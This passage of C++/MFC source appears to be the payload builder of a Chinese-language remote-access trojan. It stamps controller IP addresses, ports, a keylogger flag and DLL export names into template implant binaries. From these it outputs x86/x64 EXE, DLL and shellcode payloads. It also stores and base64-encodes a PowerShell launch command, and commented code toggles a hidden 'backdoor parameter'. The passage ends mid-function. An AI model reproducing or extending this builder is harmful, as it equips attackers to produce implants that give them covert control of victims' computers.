		memcpy(m_portinfo->m_net, str.GetBuffer(), str.GetLength() * sizeof(TCHAR));
		str = m_list_set.GetItemText(i, 2);
		memcpy(m_portinfo->port, str.GetBuffer(), str.GetLength() * sizeof(TCHAR));
		memcpy(B_portinfo + sitr, m_portinfo, sizeof(portinfo));
		sitr += sizeof(portinfo);
		if (sitr >= 65535)
		{
			g_pCBuildDlg->m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("配置太多无法保存\r\n"));
			return;
		}
	}

	if (ERROR_SUCCESS == ::RegCreateKey(HKEY_CURRENT_USER, name.GetBuffer(), &hKey))
	{
		if (ERROR_SUCCESS != ::RegSetValueEx(hKey, _T("IpDate"), 0, REG_BINARY, (unsigned char*)B_portinfo, sitr))
		{
			g_pCBuildDlg->m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("写入配置错误\r\n"));
			::RegCloseKey(hKey);
			return;
		}
	}

	::RegCloseKey(hKey);
	UpdateData(FALSE);
	SAFE_DELETE_AR(B_portinfo);
	SAFE_DELETE(m_portinfo);
}


void CBuildDlg::WritepowershellInfo()
{
	HKEY hKey;

	::RegOpenKeyEx(HKEY_CURRENT_USER, ((CQuickApp*)AfxGetApp())->g_Exename.GetBuffer(), 0, KEY_SET_VALUE, &hKey);
	::RegDeleteValue(hKey, _T("IpDatepowershell"));
	::RegCloseKey(hKey);
	DWORD powershellsize = strlen((char*)powershellLogin);

	if (ERROR_SUCCESS == ::RegCreateKey(HKEY_CURRENT_USER, ((CQuickApp*)AfxGetApp())->g_Exename.GetBuffer(), &hKey))
	{
		//if (ERROR_SUCCESS != ::RegSetValueEx(hKey, _T("IpDatepowershellsize"), 0, REG_DWORD, (const byte*)&powershellsize, 4))
		//{
		//	this->SetWindowText(_T("写入powershell配置错误"));
		//	::RegCloseKey(hKey);
		//	return;
		//}
		if (ERROR_SUCCESS != ::RegSetValueEx(hKey, _T("IpDatepowershell"), 0, REG_BINARY, (unsigned char*)powershellLogin, powershellsize))
		{
			this->SetWindowText(_T("写入powershell配置错误"));
			::RegCloseKey(hKey);
			return;
		}
	}
	::RegCloseKey(hKey);
	g_pCBuildDlg->m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("写入powershell成功\r\n"));
}

void CBuildDlg::Writepowershellcmd()
{
	HKEY hKey;

	::RegOpenKeyEx(HKEY_CURRENT_USER, ((CQuickApp*)AfxGetApp())->g_Exename.GetBuffer(), 0, KEY_SET_VALUE, &hKey);
	::RegDeleteValue(hKey, _T("IpDatepowershellcmd"));
	::RegCloseKey(hKey);
	DWORD powershellsize = code.GetLength() + 1;

	if (ERROR_SUCCESS == ::RegCreateKey(HKEY_CURRENT_USER, ((CQuickApp*)AfxGetApp())->g_Exename.GetBuffer(), &hKey))
	{

		if (ERROR_SUCCESS != ::RegSetValueEx(hKey, _T("IpDatepowershellcmd"), 0, REG_BINARY, (unsigned char*)code.GetBuffer(), powershellsize))
		{
			m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("写入powershellcmd配置错误\r\n"));
			::RegCloseKey(hKey);
			return;
		}
	}
	::RegCloseKey(hKey);
	g_pCBuildDlg->m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("写入powershellcmd成功\r\n"));
}


bool CBuildDlg::initpowershellcode()
{
	HKEY hKEY;
	DWORD dwType = REG_BINARY;
	DWORD dwTypesize = REG_DWORD;
	DWORD dw = sizeof(DWORD);
	DWORD powershellSize = 0;

	if (ERROR_SUCCESS == ::RegOpenKeyEx(HKEY_CURRENT_USER, ((CQuickApp*)AfxGetApp())->g_Exename.GetBuffer(), 0, KEY_READ, &hKEY))
	{
		RegQueryValueEx(hKEY, _T("IpDatepowershell"), NULL, &dwType, NULL, &powershellSize);
		if (powershellSize < 10)
		{
			g_pCBuildDlg->m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("POWERSHELL初始化失败。重新生成下\r\n"));
			return false;
		}
		powershellLogin = new unsigned char[powershellSize + 1];
		ZeroMemory(powershellLogin, powershellSize + 1);
		if (::RegQueryValueEx(hKEY, _T("IpDatepowershell"), 0, &dwType, (LPBYTE)powershellLogin, &powershellSize) != ERROR_SUCCESS)
		{
			g_pCBuildDlg->m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("POWERSHELL初始化失败。重新生成下\r\n"));
			return false;
		}
		powershellSize = 0;
		RegQueryValueEx(hKEY, _T("IpDatepowershellcmd"), NULL, &dwType, NULL, &powershellSize);
		if (powershellSize < 10)
		{
			g_pCBuildDlg->m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("POWERSHELLcmd初始化失败。重新生成下\r\n"));
			return false;
		}
		char* chcode = new  char[powershellSize];
		ZeroMemory(chcode, powershellSize);
		if (::RegQueryValueEx(hKEY, _T("IpDatepowershellcmd"), 0, &dwType, (LPBYTE)chcode, &powershellSize) != ERROR_SUCCESS)
		{
			g_pCBuildDlg->m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("POWERSHELLcmd初始化失败。重新生成下\r\n"));
			return false;
		}
		g_pCBuildDlg->code = chcode;
		SAFE_DELETE_AR(chcode);
		CString codew = _T("powershell上线命令 初始化完成\r\n");
		codew += g_pCBuildDlg->code;
		codew += _T("\r\n\r\n");
		g_pCBuildDlg->m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)codew.GetBuffer());
		::RegCloseKey(hKEY);
	}

	return true;
}


































BOOL CBuildDlg::PreTranslateMessage(MSG* pMsg)
{
	// TODO: Add your specialized code here and/or call the base class
	if (pMsg->message == WM_KEYDOWN)
	{
		if (pMsg->wParam == VK_ESCAPE)
			return true;
		if (pMsg->wParam == VK_RETURN)
		{
			return TRUE;
		}
	}


	return CXTPResizeFormView::PreTranslateMessage(pMsg);
}


void CBuildDlg::OnBnClickedBuildexe()
{
	UpdateData(TRUE);
	m_edit_tip.SetWindowText(_T(""));
	m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("开始生成.\r\n"));
	if (!build(0))
		m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("生成失败\r\n"));
	else
		m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("生成成功\r\n"));;
}

void CBuildDlg::OnBnClickedBuilddll()
{
	UpdateData(TRUE);
	m_edit_tip.SetWindowText(_T(""));
	m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("开始生成.\r\n"));
	if (!build(1))
		m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("生成失败\r\n"));
	else
		m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("生成成功\r\n"));;
}


BOOL CBuildDlg::build(int mode)
{
	UpdateData(TRUE);
	CFileDialog dlg(FALSE, _T(""), _T("output"), OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT, _T("可执行文件(*.*)| All Files (*.*) |*.*||"), NULL);
	if (dlg.DoModal() != IDOK)
	{
		m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("已取消生成\r\n"));
		return FALSE;
	}







	CString path;
	if (mode == 0)
	{
		if (!getsettingdata())
		{
			m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("初始化参数失败\r\n"));
			return FALSE;
		}
		path = _T("\\Plugins\\x86\\上线模块.bin");
		swprintf_s(writepath, _T("%s_86.exe"), dlg.GetPathName());
		if (!changedataandwritefile(path))
		{
			m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("x86  exe 生成失败\r\n"));
			return FALSE;
		}
		path = _T("\\Plugins\\x64\\上线模块.bin");
		swprintf_s(writepath, _T("%s_64.exe"), dlg.GetPathName());
		if (!changedataandwritefile(path))
		{
			m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("x64  exe 生成失败\r\n"));
			return FALSE;
		}
	}
	if (mode == 1)
	{
		if (MessageBox(_T("Dll加载运行DllMain吗？"), _T("加载执行"), MB_OKCANCEL) == IDOK)
		{
			MyInfo.otherset.RunDllEntryProc = true;
		}
		else
		{
			MyInfo.otherset.RunDllEntryProc = false;
		}
		if (!getsettingdata())
		{
			m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("初始化参数失败\r\n"));
			return FALSE;
		}
		path = _T("\\Plugins\\x86\\上线模块.dll");
		swprintf_s(writepath, _T("%s_86.dll"), dlg.GetPathName());
		if (!changedataandwritefile(path, TRUE))
		{
			m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("x86  dll 生成失败\r\n"));
			return FALSE;
		}
		path = _T("\\Plugins\\x64\\上线模块.dll");
		swprintf_s(writepath, _T("%s_64.dll"), dlg.GetPathName());
		if (!changedataandwritefile(path, TRUE))
		{
			m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("x64  exe 生成失败\r\n"));
			return FALSE;
		}
	}
	return TRUE;

}


BOOL CBuildDlg::getsettingdata()
{
	UpdateData(TRUE);
	m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("初始化参数\r\n"));

	_tcscpy_s(MyInfo.szAddress, m_edit_ip.GetBuffer(0));
	_tcscpy_s(MyInfo.szPort, m_edit_port.GetBuffer(0));
	MyInfo.IsTcp = h_combo_net.GetCurSel() ? false : true;

	_tcscpy_s(MyInfo.szAddress2, m_edit_ip2.GetBuffer(0));
	_tcscpy_s(MyInfo.szPort2, m_edit_port2.GetBuffer(0));
	MyInfo.IsTcp2 = h_combo_net2.GetCurSel() ? false : true;

	_tcscpy_s(MyInfo.szAddress3, m_edit_ip3.GetBuffer(0));
	_tcscpy_s(MyInfo.szPort3, m_edit_port3.GetBuffer(0));
	MyInfo.IsTcp3 = h_combo_net3.GetCurSel() ? false : true;



	_tcscpy_s(MyInfo.szRunSleep, m_edit_first_time.GetBuffer(0));
	_tcscpy_s(MyInfo.szHeart, m_edit_rest_time.GetBuffer(0));
	_tcscpy_s(MyInfo.Remark, m_edit_v.GetBuffer(0));
	_tcscpy_s(MyInfo.szGroup, m_edit_g.GetBuffer(0));



	// MyInfo.otherset.IsKeyboard = (((CButton*)GetDlgItem(IDC_CHECK_KEYBOARD))->GetCheck()) ? true : false;
	// MyInfo.otherset.antinet = (((CButton*)GetDlgItem(IDC_CHECK_NET))->GetCheck()) ? true : false;
	// MyInfo.otherset.Processdaemon = (((CButton*)GetDlgItem(IDC_CHECK_PROCESSDAEMON))->GetCheck()) ? true : false;
	// MyInfo.otherset.ProtectedProcess = (((CButton*)GetDlgItem(IDC_CHECK_PROTEXTEDPROCESS))->GetCheck()) ? true : false;
	// MyInfo.otherset.puppet = (((CButton*)GetDlgItem(IDC_CHECK_PUPPET))->GetCheck()) ? true : false;


	CString s = confimodel;
	Setfindinfo(s, _T("地址1"), MyInfo.szAddress, NULL);
	Setfindinfo(s, _T("端口1"), MyInfo.szPort, NULL);
	Setfindinfo(s, _T("通信1"), NULL, MyInfo.IsTcp);

	Setfindinfo(s, _T("地址2"), MyInfo.szAddress2, NULL);
	Setfindinfo(s, _T("端口2"), MyInfo.szPort2, NULL);
	Setfindinfo(s, _T("通信2"), NULL, MyInfo.IsTcp2);

	Setfindinfo(s, _T("地址3"), MyInfo.szAddress3, NULL);
	Setfindinfo(s, _T("端口3"), MyInfo.szPort3, NULL);
	Setfindinfo(s, _T("通信3"), NULL, MyInfo.IsTcp3);

	Setfindinfo(s, _T("等待"), MyInfo.szRunSleep, NULL);
	Setfindinfo(s, _T("重连"), MyInfo.szHeart, NULL);
	Setfindinfo(s, _T("分组"), MyInfo.szGroup, NULL);
	Setfindinfo(s, _T("版本"), MyInfo.szVersion, NULL);
	Setfindinfo(s, _T("备注"), MyInfo.Remark, NULL);

	Setfindinfo(s, _T("键盘"), NULL, MyInfo.otherset.IsKeyboard);
	//Setfindinfo(s, _T("保护"), NULL, MyInfo.otherset.ProtectedProcess);
	//Setfindinfo(s, _T("流量"), NULL, MyInfo.otherset.antinet);
	Setfindinfo(s, _T("入口"), NULL, MyInfo.otherset.RunDllEntryProc);
	//Setfindinfo(s, _T("守护"), NULL, MyInfo.otherset.Processdaemon);
	//Setfindinfo(s, _T("傀儡"), NULL, MyInfo.otherset.puppet);
	//Setfindinfo(s, _T("特别"), NULL, MyInfo.otherset.special);
	s.MakeReverse();
	ZeroMemory(confi, 1000 * 2);
	memcpy(confi, s.GetBuffer(), s.GetLength() * 2 + 2);
	return TRUE;

}

void CBuildDlg::Setfindinfo(CString& s, const TCHAR* f1, TCHAR* outstring, BOOL user)
{
	if (outstring)
		s.Replace(f1, outstring);
	else
	{
		user ? s.Replace(f1, _T("1")) : s.Replace(f1, _T("0"));
	}
}


BOOL CBuildDlg::changedataandwritefile(CString path, BOOL bchangeexport)
{
	TCHAR DatPath[MAX_PATH] = { 0 };
	GetModuleFileName(NULL, DatPath, sizeof(DatPath));
	*_tcsrchr(DatPath, _T('\\')) = '\0';
	CString path_data;
	path_data = DatPath;
	path_data += path;

	WIN32_FIND_DATA FindData;
	HANDLE hFile;
	hFile = FindFirstFile(path_data, &FindData);
	if (hFile == INVALID_HANDLE_VALUE) { m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("文件不存在")); m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)path_data.GetBuffer());  m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("\r\n"));  return FALSE; }
	FindClose(hFile);

	m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("读取文件")); 	m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)path_data.GetBuffer());  m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("\r\n"));
	hFile = CreateFile(path_data, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("读取文件失败")); 	m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)path_data.GetBuffer());  m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("\r\n"));
		return FALSE;
	}
	DWORD len = GetFileSize(hFile, NULL);
	char* str = new char[len];
	ZeroMemory(str, sizeof(str));
	DWORD wr = 0;
	ReadFile(hFile, str, len, &wr, NULL);
	CloseHandle(hFile);
	m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("修改配置信息\r\n"));
	DWORD dwOffset = -1;
	dwOffset = memfind(str, _T("xiugaishiyong"), len, 0);

	if (dwOffset == -1)											 //无法修改配置信息就退出
	{

		m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("找不到上线配置标记 \r\n"));
		m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)path_data.GetBuffer());
		m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("r\n"));
		SAFE_DELETE_AR(str);
		return FALSE;
	}

	DWORD dwOffset_export = -1;
	char* exportnamebuf = NULL;
	int exportnamelen = 0;

	if (bchangeexport)
	{

		dwOffset_export = memfind(str, "zidingyixiugaidaochuhanshu", len, 0);
		 exportnamelen = WideCharToMultiByte(CP_ACP, 0, m_edit_dll, -1, NULL, 0, NULL, NULL);
		exportnamebuf = new char[exportnamelen + 1];
		WideCharToMultiByte(CP_ACP, 0, m_edit_dll, -1, exportnamebuf, exportnamelen, NULL, NULL);
		if ((dwOffset_export == -1))  //无法修改到处函数名就退出
		{
			log_信息("找不到导出函数");
			m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("找不到导出函数zidingyixiugaidaochuhanshu标记\r\n"));
			m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)path_data.GetBuffer());
			m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("r\n"));
			SAFE_DELETE_AR(exportnamebuf);
			SAFE_DELETE_AR(str);
			return FALSE;
		}
	}



	//写出配置好的文件
	CFile file;
	if (file.Open(writepath, CFile::modeCreate | CFile::modeWrite | CFile::modeRead | CFile::typeBinary))
	{
		if (dwOffset != -1)
			memcpy(str + dwOffset, (char*)&confi, lstrlen(confi) * 2 + 1);

		if (bchangeexport)
			memcpy(str + dwOffset_export, (char*)exportnamebuf, exportnamelen);
		file.Write(str, len);
		file.Close();
		m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("写出成功")); 	m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)writepath);  m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("\r\n"));
		SAFE_DELETE_AR(str);
		return TRUE;
	}
	else
	{
		m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("文件无法创建,查看是否占用\r\n"));
		m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)writepath);
		m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("r\n"));
		SAFE_DELETE_AR(str);
		return FALSE;
	}

}

int CBuildDlg::memfind(const char* mem, const char* str, int sizem, int sizes)
{
	int   da, i, j;
	if (sizes == 0) da = strlen(str);
	else da = sizes;
	for (i = 0; i < sizem; i++)
	{
		for (j = 0; j < da; j++)
			if (mem[i + j] != str[j])	break;
		if (j == da)
			return i;
	}
	return -1;
}

int CBuildDlg::memfind(const char* mem, const TCHAR* str, int sizem, int sizes)
{
	int   da, i, j;
	if (sizes == 0) da = lstrlen(str);
	else da = sizes;
	for (i = 0; i < sizem; i++)
	{
		for (j = 0; j < da; j++)
			if (mem[i + j] != ((char*)str)[j])	break;
		if (j == da)
			return i;
	}
	return -1;
}

void CBuildDlg::OnBnClickedBuildShellcode()
{
	UpdateData(TRUE);

	m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("注意：shellcode上线只使用第一组和第二组 IP 端口配置 支持TCP UDP，其他一样\r\n"));
	CFileDialog dlg(FALSE, _T(""), _T("output"), OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT, _T("可执行文件(*.*)| All Files (*.*) |*.*||"), NULL);
	if (dlg.DoModal() != IDOK)
	{
		m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("已取消生成\r\n"));
		return;
	}

	if (!getsettingdata())
	{
		m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("初始化参数失败\r\n"));
		return;
	}

	CString path;
	path = _T("\\Plugins\\x86\\执行代码.dll");
	swprintf_s(writepath, _T("%s_86.bin"), dlg.GetPathName());
	if (!changeshellcodeandwritefile(path))
	{
		m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("x86  bin 生成失败\r\n"));
		return;
	}
	m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("x86  bin 生成成功\r\n"));
	path = _T("\\Plugins\\x64\\执行代码.dll");
	swprintf_s(writepath, _T("%s_64.bin"), dlg.GetPathName());
	if (!changeshellcodeandwritefile(path))
	{
		m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("x64  bin 生成失败\r\n"));
		return;
	}
	m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("x64  bin 生成成功\r\n"));

}

BOOL CBuildDlg::changeshellcodeandwritefile(CString path)
{
	TCHAR DatPath[MAX_PATH] = { 0 };
	GetModuleFileName(NULL, DatPath, sizeof(DatPath));
	*_tcsrchr(DatPath, _T('\\')) = '\0';
	CString path_data;
	path_data = DatPath;
	path_data += path;

	ShellCodeInfo m_ShellCodeInfo;
	memcpy(&m_ShellCodeInfo, &MyShellCodeInfo, sizeof(ShellCodeInfo));
	int nLen = wcslen(m_edit_ip.GetBuffer(0)) + 1;
	char addr1[256] = {};
	WideCharToMultiByte(CP_ACP, 0, m_edit_ip.GetBuffer(0), nLen, addr1, 2 * nLen, NULL, NULL);
	m_ShellCodeInfo.szPort1 = _ttoi(m_edit_port.GetBuffer(0));
	m_ShellCodeInfo.IsTcp1 = h_combo_net.GetCurSel() ? false : true;
	m_ShellCodeInfo.addrlen1 = strlen(addr1)+1;

	 nLen = wcslen(m_edit_ip2.GetBuffer(0)) + 1;
	 char addr2[256] = {};
	WideCharToMultiByte(CP_ACP, 0, m_edit_ip2.GetBuffer(0), nLen, addr2, 2 * nLen, NULL, NULL);
	m_ShellCodeInfo.szPort2 = _ttoi(m_edit_port2.GetBuffer(0));
	m_ShellCodeInfo.IsTcp2 = h_combo_net2.GetCurSel() ? false : true;
	m_ShellCodeInfo.addrlen2 = strlen(addr2) + 1;
	//读取文件
	HANDLE hFile = CreateFile(path_data, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("shellcode生成失败\r\n"));
		return FALSE;
	}
	DWORD len = GetFileSize(hFile, NULL);
	char* str = new char[len];
	ZeroMemory(str, sizeof(str));
	DWORD wr = 0;
	ReadFile(hFile, str, len, &wr, NULL);
	CloseHandle(hFile);

	//组合配置数据
	int shellcodesize = len + sizeof(ShellCodeInfo) + m_ShellCodeInfo.addrlen1 + m_ShellCodeInfo.addrlen2 + lstrlen(confi) * 2 + 2;
	unsigned char* lpDatBuffer = new unsigned char[shellcodesize];
	ZeroMemory(lpDatBuffer, shellcodesize);
	CopyMemory(lpDatBuffer, str, len);
	CopyMemory(lpDatBuffer + len, (LPCVOID)&m_ShellCodeInfo, sizeof(ShellCodeInfo));
	CopyMemory(lpDatBuffer + len+ sizeof(ShellCodeInfo), addr1, m_ShellCodeInfo.addrlen1);
	CopyMemory(lpDatBuffer + len + sizeof(ShellCodeInfo)+ m_ShellCodeInfo.addrlen1, addr2, m_ShellCodeInfo.addrlen2);
	CopyMemory(lpDatBuffer + len + sizeof(ShellCodeInfo)+ m_ShellCodeInfo.addrlen1+ m_ShellCodeInfo.addrlen2, confi, lstrlen(confi) * 2 + 2);

	SAFE_DELETE_AR(str);
	//写出文件

	HANDLE h_bin = CreateFileW(writepath, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, NULL, NULL);
	DWORD dwBytesWritten = 0;
	if (INVALID_HANDLE_VALUE == h_bin || NULL == h_bin) {
		m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("shellcode.bin生成失败\r\n"));
		SAFE_DELETE_AR(lpDatBuffer);
		return FALSE;
	}
	else {
		if (!WriteFile(h_bin, lpDatBuffer, (DWORD)shellcodesize, &dwBytesWritten, NULL)) {
			m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("shellcode生成失败\r\n"));
			SAFE_DELETE_AR(lpDatBuffer);
			return FALSE;
		}
		FlushFileBuffers(h_bin);
		CloseHandle(h_bin);
	}
	SAFE_DELETE_AR(lpDatBuffer);
	return TRUE;
}


//powershell
void CBuildDlg::OnBnClickedBuildPowershell()
{
	UpdateData(TRUE);

	getsettingdata();

	m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("开始生成powershell  只使用第一排地址、端口。协议必须是TCP 其他正常设置\r\n"));
	if (!getsettingdata())
	{
		m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("初始化参数失败\r\n"));
		return;
	}
	CString path32;
	path32 = _T("\\Plugins\\x86\\执行代码.dll");
	CString path64;
	path64 = _T("\\Plugins\\x64\\执行代码.dll");
	if (!changepowershellandwritefile(path32, path64, true))
	{
		m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T(" powershell 配置失败\r\n"));
		return;
	}
	m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("  powershell 配置成功 并保存SHELCODE配置\r\n"));
	WritepowershellInfo();
	Writepowershellcmd();
}


void CBuildDlg::OnBnClickedBuildPowershellSet()
{
	UpdateData(TRUE);
	CStringA powershell_set;

	((CEdit*)GetDlgItem(IDC_EDIT__POWERSHELL))->GetWindowTextW(m_edit_powershell);
	powershell_set = m_edit_powershell;
	SAFE_DELETE_AR(powershellLogin);
	powershellLogin = new unsigned char[powershell_set.GetLength() + 1];
	ZeroMemory(powershellLogin, powershell_set.GetLength() + 1);
	memcpy(powershellLogin, powershell_set.GetBuffer(), powershell_set.GetLength() + 1);
	WritepowershellInfo();
	m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("  powershell 替换完成\r\n"));
}

void CBuildDlg::OnBnClickedButtonPowershellGet()
{
	CString  Strbackdoor;
	((CEdit*)GetDlgItem(IDC_EDIT__POWERSHELL))->GetWindowTextW(Strbackdoor);
	//if (Strbackdoor.Compare(_T("520")) == 0)
	//{
	//	MyInfo.otherset.special = TRUE;
	//	m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("后门参数已经打开\r\n"));
	//	return;
	//}
	//if (Strbackdoor.Compare(_T("1314")) == 0)
	//{
	//	MyInfo.otherset.special = FALSE;
	//	m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("后门参数已经取消\r\n"));
	//	return;
	//}
	m_edit_powershell = powershellLogin;
	((CEdit*)GetDlgItem(IDC_EDIT__POWERSHELL))->SetWindowTextW(m_edit_powershell);
	UpdateData(FALSE);
	m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("powershellcode获取成功\r\n"));
}


void CBuildDlg::OnBnClickedButtonDecode()
{
	UpdateData(TRUE);
	unsigned	char* decode = NULL;
	CStringA decodedata;
	((CEdit*)GetDlgItem(IDC_EDIT__POWERSHELL))->GetWindowTextW(m_edit_powershell);
	decodedata = m_edit_powershell;
	decode = base64_decode((unsigned	char*)decodedata.GetBuffer());
	m_edit_powershell = decode;
	((CEdit*)GetDlgItem(IDC_EDIT__POWERSHELL))->SetWindowTextW(m_edit_powershell);
	UpdateData(FALSE);
	free(decode);
	m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("  powershellcode base64 解码成功\r\n"));

}


void CBuildDlg::OnBnClickedButtonEncode()
{
	UpdateData(TRUE);
	unsigned	char* encode = NULL;
	CStringA decodedata;
	((CEdit*)GetDlgItem(IDC_EDIT__POWERSHELL))->GetWindowTextW(m_edit_powershell);
	decodedata = m_edit_powershell;
	encode = base64_encode((unsigned char*)decodedata.GetBuffer(), decodedata.GetLength());
	m_edit_powershell = encode;
	((CEdit*)GetDlgItem(IDC_EDIT__POWERSHELL))->SetWindowTextW(m_edit_powershell);
	UpdateData(FALSE);
	free(encode);
	m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("  powershellcode base64 编码成功\r\n"));

}

void CBuildDlg::OnBnClickedButtonPowershellOut()
{


	CStringA decodedata;
	((CEdit*)GetDlgItem(IDC_EDIT__POWERSHELL))->GetWindowTextW(m_edit_powershell);
	decodedata = m_edit_powershell;

	CFileDialog dlg(FALSE, _T(""), _T("Powershell"), OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT, _T("可执行文件(*.*)| All Files (*.*) |*.*||"), NULL);
	if (dlg.DoModal() != IDOK)
	{
		m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("已取消导出power额hell\r\n"));
		return;
	}
	swprintf_s(writepath, _T("%s.bin"), dlg.GetPathName());
	HANDLE h_bin = CreateFileW(writepath, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, NULL, NULL);
	DWORD dwBytesWritten = 0;
	if (INVALID_HANDLE_VALUE == h_bin || NULL == h_bin) {
		m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("Powershell.bin生成失败\r\n"));
		return;
	}
	else {
		if (!WriteFile(h_bin, decodedata.GetBuffer(), (DWORD)decodedata.GetLength(), &dwBytesWritten, NULL)) {
			m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("Powershell.bin生成失败\r\n"));
			return;
		}
		FlushFileBuffers(h_bin);
		CloseHandle(h_bin);
	}
	m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T(" Powershell.bin生成成功\r\n"));

}


BOOL CBuildDlg::changepowershellandwritefile(CString path32, CString path64, bool b_isx86)
{
	TCHAR DatPath[MAX_PATH] = { 0 };
	GetModuleFileName(NULL, DatPath, sizeof(DatPath));
	*_tcsrchr(DatPath, _T('\\')) = '\0';
	CString path_data32, path_data64;
	path_data32 = DatPath;
	path_data32 += path32;
	path_data64 = DatPath;
	path_data64 += path64;

	ShellCodeInfo m_ShellCodeInfo;
	memcpy(&m_ShellCodeInfo, &MyShellCodeInfo, sizeof(ShellCodeInfo));
	int nLen = wcslen(m_edit_ip.GetBuffer(0)) + 1;
	char addr1[256] = {};
	WideCharToMultiByte(CP_ACP, 0, m_edit_ip.GetBuffer(0), nLen, addr1, 2 * nLen, NULL, NULL);
	m_ShellCodeInfo.szPort1 = _ttoi(m_edit_port.GetBuffer(0));
	m_ShellCodeInfo.IsTcp1 = h_combo_net.GetCurSel() ? false : true;
	m_ShellCodeInfo.addrlen1 = strlen(addr1) + 1;

	nLen = wcslen(m_edit_ip2.GetBuffer(0)) + 1;
	char addr2[256] = {};
	WideCharToMultiByte(CP_ACP, 0, m_edit_ip2.GetBuffer(0), nLen, addr2, 2 * nLen, NULL, NULL);
	m_ShellCodeInfo.szPort2 = _ttoi(m_edit_port2.GetBuffer(0));
	m_ShellCodeInfo.IsTcp2 = h_combo_net2.GetCurSel() ? false : true;
	m_ShellCodeInfo.addrlen2 = strlen(addr2) + 1;
	//加密配置
